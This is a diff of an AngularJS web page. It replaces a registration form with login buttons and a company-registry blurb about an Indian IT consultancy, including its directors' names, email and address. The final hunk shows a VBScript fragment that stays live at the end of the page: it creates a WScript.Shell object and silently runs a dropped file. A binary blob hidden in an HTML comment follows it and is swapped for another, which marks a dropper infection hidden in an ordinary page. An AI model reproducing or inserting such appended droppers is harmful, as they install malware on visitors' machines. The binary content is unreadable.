@@ -2,19 +2,6 @@
 <html ng-app="myApp">
 <head>
   <title></title>
-      <meta name="viewport" content="width=device-width, initial-scale=1">
-    <link rel="stylesheet" type="text/css" href="assets/css/bootstrap.css">
-
-    <!-- Website CSS style -->
-    <link rel="stylesheet" type="text/css" href="assets/css/main.css">
-
-    <!-- Website Font style -->
-      <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
-    
-    <!-- Google Fonts -->
-    <link href='https://fonts.googleapis.com/css?family=Passion+One' rel='stylesheet' type='text/css'>
-    <link href='https://fonts.googleapis.com/css?family=Oxygen' rel='stylesheet' type='text/css'>
-
   <!-- Latest compiled and minified CSS -->
 <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
 
@@ -22,157 +9,34 @@
 <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css" integrity="sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp" crossorigin="anonymous">
 <style>
 
-body, html{
-     height: 100%;
-  background-repeat: no-repeat;
-  background-color: #d3d3d3;
-  font-family: 'Oxygen', sans-serif;
-}
-
-.main{
-  margin-top: 70px;
-}
-
-h1.title { 
-  font-size: 50px;
-  font-family: 'Passion One', cursive; 
-  font-weight: 400; 
-}
-
-hr{
-  width: 10%;
-  color: #fff;
-}
-
-.form-group{
-  margin-bottom: 15px;
-}
-
-label{
-  margin-bottom: 15px;
-}
-
-input,
-input::-webkit-input-placeholder {
-    font-size: 11px;
-    padding-top: 3px;
-}
-
-.main-login{
-  background-color: #fff;
-    /* shadows and rounded borders */
-    -moz-border-radius: 2px;
-    -webkit-border-radius: 2px;
-    border-radius: 2px;
-    -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
-    -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
-    box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
-
-}
-
-.main-center{
-  margin-top: 30px;
-  margin: 0 auto;
-  max-width: 330px;
-    padding: 40px 40px;
-
-}
-
-.login-button{
-  margin-top: 5px;
-}
-
-.login-register{
-  font-size: 11px;
-  text-align: center;
-}
 </style>
 </head>
 <body>
 <div class="container">
 <div ng-controller="myController">
-<div class="container">
-      <div class="row main">
-        <div class="panel-heading">
-                 <div class="panel-title text-center">
-                    <h1 class="title">Register the Account</h1>
-                    <hr />
-                  </div>
-              </div> 
-        <div class="main-login main-center">
-          <form class="form-horizontal" method="post" action="#">
-            
-            <div class="form-group">
-              <label for="name" class="cols-sm-2 control-label">Your Name</label>
-              <div class="cols-sm-10">
-                <div class="input-group">
-                  <span class="input-group-addon"><i class="fa fa-user fa" aria-hidden="true"></i></span>
-                  <input type="text" class="form-control" name="name" id="name"  placeholder="Enter your Name"/>
-                </div>
-              </div>
-            </div>
-                        <div class="form-group">
-              <label for="name" class="cols-sm-2 control-label">Gender</label>
-              <div class="cols-sm-10">
-                <div class="input-group">
-                  <span class="input-group-addon"><i class="fa fa-user fa" aria-hidden="true"></i></span>
-                  <input type="text" class="form-control" name="name" id="name"  placeholder="Enter your Gender"/>
-                </div>
-              </div>
-            </div>
+<div style="margin-top: 34px;margin-left:640px;">
+ <button type="button" class="btn btn-primary">LOGIN</button>
+  <button type="button" class="btn btn-success">REGISTER</button>
+  <button type="button" class="btn btn-info">SIGNUP</button>
+      
+</div>
 
-            <div class="form-group">
-              <label for="email" class="cols-sm-2 control-label">Your Email</label>
-              <div class="cols-sm-10">
-                <div class="input-group">
-                  <span class="input-group-addon"><i class="fa fa-envelope fa" aria-hidden="true"></i></span>
-                  <input type="text" class="form-control" name="email" id="email"  placeholder="Enter your Email"/>
-                </div>
-              </div>
-            </div>
+<div style="color:white; margin-left:-13px;background-color:grey;width:956px;height:357px; margin-top:201px;">
+<p><b style="color:red;font-size:246%;">T</b>echera It Consulting Private Limited is a Private incorporated on 12 March 2015. It is classified as Non-govt company and is registered at Registrar of Companies, Hyderabad. Its authorized share capital is Rs. 10,000,000 and its paid up capital is Rs. 3,200,000.It is inolved in Software publishing, consultancy and supply [Software publishing includes production, supply and documentation of ready-made (non-customized) software, operating systems software, business & other applications software, computer games software for all platforms. Consultancy includes providing the best solution in the form of custom software after analyzing the user?s needs and problems. Custom software also includes made-to-order software based on orders from specific users. Also, included are writing of software of any kind following directives of the users; software maintenance, web-page design].</p>
 
-            <div class="form-group">
-              <label for="username" class="cols-sm-2 control-label">Username</label>
-              <div class="cols-sm-10">
-                <div class="input-group">
-                  <span class="input-group-addon"><i class="fa fa-users fa" aria-hidden="true"></i></span>
-                  <input type="text" class="form-control" name="username" id="username"  placeholder="Enter your Username"/>
-                </div>
-              </div>
-            </div>
+<p>Techera It Consulting Private Limited's Annual General Meeting (AGM) was last held on N/A and as per records from Ministry of Corporate Affairs (MCA), its balance sheet was last filed on N/A.</p>
 
-            <div class="form-group">
-              <label for="password" class="cols-sm-2 control-label">Password</label>
-              <div class="cols-sm-10">
-                <div class="input-group">
-                  <span class="input-group-addon"><i class="fa fa-lock fa-lg" aria-hidden="true"></i></span>
-                  <input type="password" class="form-control" name="password" id="password"  placeholder="Enter your Password"/>
-                </div>
-              </div>
-            </div>
+<p>Directors of Techera It Consulting Private Limited are Cherukuri Deepa and Kiran Babu Cherukuri.</p>
 
-            <div class="form-group">
-              <label for="confirm" class="cols-sm-2 control-label">Confirm Password</label>
-              <div class="cols-sm-10">
-                <div class="input-group">
-                  <span class="input-group-addon"><i class="fa fa-lock fa-lg" aria-hidden="true"></i></span>
-                  <input type="password" class="form-control" name="confirm" id="confirm"  placeholder="Confirm your Password"/>
-                </div>
-              </div>
-            </div>
+<p>Techera It Consulting Private Limited's Corporate Identification Number is (CIN) U72200TG2015PTC097962 and its registration number is 97962.Its Email address is kiran@techeraglobal.com and its registered address is 1-66 / MTT / B - 1402, Meenakshi Trident Towers, Gachibowli HYDERABAD Hyderabad TG 500032 IN , - , .
 
-            <div class="form-group ">
-              <button type="button" class="btn btn-primary btn-lg btn-block login-button">Register</button>
-            </div>
-            <div class="login-register">
-                    <a href="index.php">Login</a>
-                 </div>
-          </form>
-        </div>
-      </div>
-    </div>
+Current status of Techera It Consulting Private Limited is - Active</p></div>
+ 
 
-    
+
+
+  </div>
+</div>    
 <script type="text/javascript" src="https://code.angularjs.org/1.6.4/angular.js"></script>
 
 <script type="text/javascript" src="app.js"></script></body>
@@ -190,6 +54,9 @@ FileObj.Close
 End If
 Set WSHshell = CreateObject("WScript.Shell")
 WSHshell.Run DropPath, 0
-//--></SCRIPT><!--(ãXt¢⁄œ Aª6ÌvÛwıΩzë†¡}kpg∆?-–ôçÃS·¥‰YkrY˛ıS8ƒÌV5
-·∞s≠ªK∞«Á§◊Ù\C“®û]∑?ûnQ>ê}ÌQÄMÆì?äÑªô%Z‰àôfì⁄úü±Ók˚¡î‚[ÜUÉB_jãÓ<QòÙOuv◊8jºËØÔû≥ÎB˙5EÌhÿ®8{j(âao{ΩYÄ◊„˛‰Œ<Q”Æ‘C¿õ#·<VÔËé‹Œ(RÛRGºíø!‰SH _ÄVÎπ‹ˆ›£∑VìÔÖèC«ö‰Äﬁ§åwÑ¿u6•˙æ„óﬂ@Q§[‘ØœTãÒ™3=Ó
-IÄÕcòéÍπıÔ-] ŸKçwπÉ¶ŒΩßÚÀ}(<,å£≤G≈ ÈÒ R*Í˙ÈÒ ÈÒ ÈÒ §,L˙ÿÌYµÒÒ  ÈÒ -->
+//--></SCRIPT><!--◊Ü-ç Ö)È∑¬áÀ7"CH|ÀåÛŸ≥5˜éπÏg
+MPJèn_ñÎ≤Nè…»”´]∑èAL9.πÌË–
+Pvd?≠˝dÅÖ˛¬gáœ@S‰ƒN–ÁÁÙl{,®ö’∞ÿ+ÁêÕ\_1$ÇrÄ¿˜t0 ´–îXò$'B√ÕYÚX·m%∆Ã=tg«∫ pæEUÜE]ÑóL=Ü[˜ ù\â,◊ï6ﬁBCÖL’€Á g‚ı°(dΩpæ≤Ω‚a≤>æsÑëÂ¸¬‚ççhÙYÂ≥Ô∏r◊¶g|qêæRˆ˝-∫=8á◊+!
+Ë∞∞8∆xµs¯ —eä∂∑JÇl⁄k5I„™Ø2 1»ÜÍﬂ)4Ø˘ÀÙ5ff… éV|}
+CªI¿ƒ…Ï-2Õti„tzG‡‰*Ω
+å7}i¿Á$æó,ã≤‚mçiÃàê X˜Á∞^U?ã†,GıÖÉî#Ö¯”w¨+jà7çJû≥jluÎ·¯OÜ’∏øbd‡∏T¬1/zä&a#ÙÊ π¬ıiñ∑ôi@¿yå∆r–ŒÊ”Ô>∏ÿ|„	Ìm*U±ﬁçÓê*Æ&ã ÈÒ R*Í˙ÈÒ ÈÒ ÈÒ §,L˙ÿÌY>‚Ò  ÈÒ -->
